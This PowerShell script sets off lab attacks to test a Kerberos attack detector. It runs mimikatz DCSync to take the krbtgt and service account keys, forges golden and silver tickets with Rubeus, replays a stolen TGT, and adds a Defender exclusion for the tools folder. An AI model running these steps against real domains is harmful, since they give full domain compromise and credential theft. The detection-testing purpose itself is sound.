# ============================================================================
#  DETONATION SCRIPT — ISOLATED LAB ONLY.
#  Forges Kerberos tickets (golden / silver / pass-the-ticket) to produce the
#  malicious 4768/4769/4624 events the detector must catch. Running this against
#  any network you are not authorized to test is illegal. The range NSG is
#  locked to your IP and the domain is disposable — keep it that way.
# ============================================================================
param([string]$RunId)
$ErrorActionPreference = "Stop"
if ((Read-Host "Type LAB to confirm this is your disposable range") -ne "LAB") { exit 1 }
if (-not $RunId) { $RunId = (Get-Date -Format "yyyyMMdd-HHmmss") }

# Ground-truth action ledger — independent of the detector (HYPOTHESIS.md §"Ground
# truth is independent of the detector"). Each scenario stamps its own start/stop
# + expected verdict so the capture can be aligned without trusting Canon's labels.
$LedgerDir = "C:\capture\run-$RunId"; New-Item -ItemType Directory -Force -Path $LedgerDir | Out-Null
$Ledger = Join-Path $LedgerDir "actions.jsonl"
function Mark-Action($id, $kind, $expected, [scriptblock]$do) {
    $rec = [ordered]@{ action_id=$id; kind=$kind; source_host=$env:COMPUTERNAME;
                       started_at=(Get-Date).ToString("o"); expected=$expected }
    try { & $do } finally {
        $rec.ended_at = (Get-Date).ToString("o")
        ($rec | ConvertTo-Json -Compress) | Add-Content $Ledger -Encoding utf8
        Write-Host "  [ledger] $id -> $Ledger" -ForegroundColor DarkGray
    }
}

# --- 0. Prereqs -------------------------------------------------------------
# Stage the offensive tooling yourself in C:\Tools (compile GhostPack Rubeus;
# mimikatz release binary). Auto-downloading them is unreliable and AV-flagged.
$Tools = "C:\Tools"
# Lab-only: stop Defender from quarantining the tooling folder.
Add-MpPreference -ExclusionPath $Tools -ErrorAction SilentlyContinue
$Rubeus   = Join-Path $Tools "Rubeus.exe"
$Mimikatz = Join-Path $Tools "mimikatz.exe"
if (-not (Test-Path $Rubeus))   { Write-Host "Missing $Rubeus (compile GhostPack Rubeus)."   -ForegroundColor Red; exit 1 }

$Domain = "corp.local"
$Sid    = (Get-ADDomain).DomainSID.Value
Write-Host "[*] Domain SID: $Sid" -ForegroundColor Cyan

# --- 1. Extract keys via DCSync (run on the DC as domain admin) --------------
# krbtgt key -> golden;  svc_cifs key -> silver. Paste the AES256 keys below.
Write-Host "[*] Run these, copy the AES256 keys:" -ForegroundColor Cyan
Write-Host "    $Mimikatz `"lsadump::dcsync /domain:$Domain /user:krbtgt`" exit"
Write-Host "    $Mimikatz `"lsadump::dcsync /domain:$Domain /user:svc_cifs`" exit"
$KrbtgtAes = Read-Host "krbtgt   aes256 key"
$SvcAes    = Read-Host "svc_cifs aes256 key"

# --- 2. GOLDEN: forged TGT, no AS-REQ ever issued it -------------------------
# Presenting it in a TGS-REQ makes a 4769 whose RequestTicketHash matches NO
# issued ResponseTicketHash on any DC  ->  detector: kind=golden, tier=hash.
Write-Host "[*] Golden ticket for a bogus principal 'attacker'..." -ForegroundColor Magenta
Mark-Action "golden-001" "golden" @{ verdict = "golden"; tier = "hash" } {
    & $Rubeus golden /aes256:$KrbtgtAes /user:attacker /domain:$Domain /sid:$Sid /ptt
    klist purge | Out-Null
    & $Rubeus golden /aes256:$KrbtgtAes /user:attacker /domain:$Domain /sid:$Sid /ptt
    Get-ChildItem "\\dc01.corp.local\SYSVOL" | Out-Null    # -> TGS-REQ (4769) under the forged TGT
}

# --- 3. SILVER: forged service ticket, never touches the KDC -----------------
# AP-REQ straight to CIFS/dc01 -> a 4624 on the target with NO issuing 4769.
# member-side frontier: detector sees a service use with no service-ticket grant.
Write-Host "[*] Silver ticket for CIFS/dc01..." -ForegroundColor Magenta
Mark-Action "silver-001" "silver" @{ verdict = $null; note = "member-side blind spot — expected NOT flagged by detect_ticket_attacks" } {
    klist purge | Out-Null
    & $Rubeus silver /service:CIFS/dc01.corp.local /aes256:$SvcAes /user:attacker /domain:$Domain /sid:$Sid /ptt
    Get-ChildItem "\\dc01.corp.local\C$" -ErrorAction SilentlyContinue | Out-Null
}

# --- 4. PASS-THE-TICKET: a real TGT, reused from another host ----------------
# Capture alice's LEGIT TGT here (issued to mbr01's IP), then present it from a
# different source IP -> 4769 for a ticket whose issuing 4768 has a different
# IpAddress  ->  detector: kind=pass-the-ticket, tier=hash.
Write-Host "[*] Pass-the-ticket: capture alice's real TGT, replay from a 2nd context." -ForegroundColor Magenta
Write-Host "    On mbr01 as alice:   $Rubeus dump /nowrap        # copy alice's .kirbi (base64)"
Write-Host "    On dc01 (diff IP):   $Rubeus ptt /ticket:<b64>   then  dir \\dc01\SYSVOL"
Write-Host "    (2-box lab: the DC's source IP differs from mbr01's -> IP divergence)" -ForegroundColor Yellow
# PtT is manual (2 hosts) — stamp its ledger entry by hand around the replay:
Mark-Action "ptt-001" "pass-the-ticket" @{ verdict = "pass-the-ticket"; tier = "hash" } {
    Read-Host "  [ptt] press Enter AFTER you've done the dump+ptt+dir replay above"
}

Write-Host "[+] Detonation complete. Next: run 06-export-and-verify.ps1 -RunId $RunId (DC, then member)." -ForegroundColor Green
